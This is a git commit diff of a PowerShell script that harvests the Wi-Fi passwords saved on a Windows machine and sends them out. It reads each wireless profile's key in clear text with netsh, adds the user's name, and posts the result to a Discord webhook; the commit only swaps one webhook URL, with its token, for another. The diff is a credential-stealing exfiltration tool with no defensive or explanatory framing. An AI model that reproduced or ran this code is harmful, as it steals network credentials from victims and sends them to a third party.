e03d305d140bf22538df48cbef8cb9c1048c3aaf
Joel A Marinay Jr <66583724+joel2128@users.noreply.github.com>
2024-10-20 16:06:31 +0800

    wef

--- MD/WP-Eng.ps1
+++ MD/WP-Eng.ps1
@@ -3,7 +3,7 @@
 netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
     $wlan  = $_.Matches.Value
     $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'
-	$discord='https://discord.com/api/webhooks/1297456168473595955/W0Ce4qM77MCgoJaHX1jQetraeb0xh8uxpcN6CvfuGrJqU-9n5llZERNtj6lTrsFhKNtE'
+	$discord='https://discord.com/api/webhooks/1297470837779333141/8AHSJu020L0KTuKxTcsMP5gaUQoy8M1IIX_1ts-DAsvj8748RNmEm0N9Xoxk-vy-_Gh-'
 
 	$Body = @{
 		'username' = $env:username + " | " + [string]$wlan
